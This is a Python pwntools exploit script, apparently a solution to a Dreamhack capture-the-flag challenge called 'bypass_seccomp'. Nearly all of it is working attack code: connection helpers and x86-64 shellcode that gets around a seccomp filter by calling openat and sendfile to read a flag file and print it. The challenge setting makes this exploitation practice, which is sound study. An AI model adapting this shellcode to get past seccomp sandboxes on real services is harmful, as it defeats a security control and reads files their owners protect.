#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./bypass_seccomp', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main+161
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 12318)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

shellcode = asm(
    '''
    xor rdi, rdi
    mov dil, 0x2
    lea rsi, [rip + flag]
    xor rdx, rdx
    xor r10, r10
    xor rax, rax
    mov eax, 0x101
    syscall

    mov rsi, rax
    xor rdi, rdi
    mov dil, 0x1
    xor rdx, rdx
    mov r10, 0x64
    xor rax, rax
    mov al, 0x28
    syscall
    ret
    flag:
        .asciz "/home/bypass_seccomp/flag"
    ''', arch = 'amd64', os = 'linux')

io = start()
sla(b'shellcode: ', shellcode)
io.interactive()